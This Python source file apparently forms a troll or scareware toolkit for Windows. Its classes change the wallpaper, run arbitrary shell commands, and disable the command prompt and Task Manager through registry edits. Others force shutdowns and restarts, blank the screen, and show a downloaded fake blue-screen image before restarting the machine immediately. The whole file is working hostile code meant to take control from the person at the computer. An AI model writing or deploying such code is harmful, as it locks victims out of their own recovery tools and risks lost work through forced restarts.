import ctypes
import os
import webbrowser
import requests
from tkinter import *
import socket
from tkinter import messagebox
from PIL import Image, ImageTk

class ChangeWallpaper:
    def __init__(self, path):
        self.path = path

        try:
            path = os.path.abspath(path)
            ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)

            print(f"successfully changed wallpaper to {path}")
        except FileNotFoundError:
            raise FileNotFoundError(path)

class RunCommand:
    def __init__(self, command):
        self.command = command

        os.system(f"{command}")

class StartFile:
    def __init__(self, path):
        self.path = path
        try:
            os.startfile(path)
            print(f"Successfully started {path}")
        except FileNotFoundError:
            raise FileNotFoundError(path)

class OpenURL:
    def __init__(self, url):
        self.url = url

        try:
            webbrowser.open_new_tab(self.url)
            print(f"Successfully opened {url}")
        except requests.exceptions.RequestException:
            print(f"Failed to open {url}")

class BlockCmd:
    def __init__(self):
        os.system(f'REG ADD "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v "DisableCMD" /t REG_DWORD /d 1 /f')
        print(f"Successfully blocked command prompt.")


class BlockTaskmgr:
    def __init__(self):
        os.system('REG ADD "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f')
        print("successfully blocked taskmgr.")

class Shutdown:
    def __init__(self, seconds):
        self.seconds = seconds

        os.system(f"shutdown /s /t {seconds}")

class Restart:
    def __init__(self, seconds):
        self.seconds = seconds

        os.system(f"shutdown /r /t {seconds}")

class BlackScreen:
    def __init__(self, seconds):
        self.seconds = seconds

        def destroy():
            ms = seconds * 1000
            window.after(ms, window.destroy)

        window = Tk()

        window.attributes("-fullscreen", True)
        window.configure(bg="black")

        destroy()

        window.mainloop()

class IP:
    def __init__(self):
        ip = socket.gethostbyname(socket.gethostname())
        messagebox.showinfo("IP", ip)

class FakeBsod:
    def __init__(self):
        bsod_url = "https://esports.ch/wp-content/uploads/2024/07/windows10-bsod-1024x576.jpg"
        bsod_r = requests.get(bsod_url)
        with open("bsodImage.jpg", "wb") as file:
            file.write(bsod_r.content)

        bsod_path = os.path.abspath("bsodImage.jpg")

        def restart():
            window.after(10000, restart)
            os.system("shutdown /r /t 0")

        window = Tk()

        screen_height = window.winfo_screenheight()
        screen_width = window.winfo_screenwidth()

        bsod = Image.open(bsod_path).resize((screen_width, screen_height))
        bsod = ImageTk.PhotoImage(bsod)

        window.attributes("-fullscreen", True)

        bsod_label = Label(window, image=bsod)
        bsod_label.pack()

        restart()

        window.mainloop()
